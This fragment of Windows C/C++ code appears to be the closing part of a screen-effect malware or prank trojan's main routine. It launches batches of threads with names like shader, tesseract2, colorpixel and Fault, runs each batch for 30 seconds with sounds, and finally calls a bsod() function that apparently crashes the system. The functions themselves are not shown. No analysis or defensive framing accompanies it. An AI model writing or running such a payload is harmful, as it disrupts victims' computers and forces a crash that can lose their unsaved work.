            HANDLE thread15 = CreateThread(0, 0, mixgraphic, 0, 0, 0);
            HANDLE thread16 = CreateThread(0, 0, mixicon, 0, 0, 0);
            HANDLE thread17 = CreateThread(0, 0, partunnel, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread14, 0);
            TerminateThread(thread15, 0);
            TerminateThread(thread16, 0);
            TerminateThread(thread17, 0);
            InvalidateRect(0, 0, 0);
            sound6();
            HANDLE thread18 = CreateThread(0, 0, tesseract2, 0, 0, 0);
            HANDLE thread19 = CreateThread(0, 0, colorpixel, 0, 0, 0);
            HANDLE thread20 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE thread21 = CreateThread(0, 0, shader5, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread19, 0);
            TerminateThread(thread20, 0);
            TerminateThread(thread21, 0);
            InvalidateRect(0, 0, 0);
            sound7();
            HANDLE thread22 = CreateThread(0, 0, fenlie, 0, 0, 0);
            HANDLE thread23 = CreateThread(0, 0, fenlie2, 0, 0, 0);
            HANDLE thread24 = CreateThread(0, 0, shader2, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread22, 0);
            TerminateThread(thread23, 0);
            InvalidateRect(0, 0, 0);
            sound8();
            HANDLE thread25 = CreateThread(0, 0, Fault, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread18, 0);
            TerminateThread(thread24, 0);
            TerminateThread(thread25, 0);
            InvalidateRect(0, 0, 0);
            sound9();
            HANDLE thread26 = CreateThread(0, 0, shader3, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread26, 0);
            InvalidateRect(0, 0, 0);
            sound10();
            HANDLE thread27 = CreateThread(0, 0, sierpinskicube, 0, 0, 0);
            HANDLE thread28 = CreateThread(0, 0, shader2, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread27, 0);
            TerminateThread(thread28, 0);
            InvalidateRect(0, 0, 0);
            bsod();
            return 0;
        }
    }
}